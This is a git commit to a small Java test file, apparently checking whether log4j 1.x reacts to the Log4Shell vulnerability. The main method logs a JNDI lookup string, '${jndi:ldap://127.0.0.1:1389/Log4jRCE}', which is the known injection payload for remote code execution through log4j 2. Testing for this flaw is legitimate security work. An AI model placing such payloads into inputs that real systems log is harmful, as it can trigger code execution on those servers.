f7a06d18df5496f02d93605fe542e439933da3ce
xiangkun.tao <torrific55@gmail.com>
2021-12-10 15:52:18 +0900

    test on log4j_1

--- src/main/java/log4j.java
+++ src/main/java/log4j.java
@@ -1,11 +1,16 @@
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
+import org.apache.log4j.BasicConfigurator;
+import org.apache.log4j.Logger;
+//import org.apache.logging.log4j.LogManager;
+//import org.apache.logging.log4j.Logger;
 
 
 public class log4j {
-    private static final Logger logger = LogManager.getLogger(log4j.class);
+    private final static Logger logger = Logger.getLogger(log4j.class);
+
+    // private static final Logger logger = LogManager.getLogger(log4j.class);
 
     public static void main(String[] args) {
+        BasicConfigurator.configure();
         logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
     }
 }
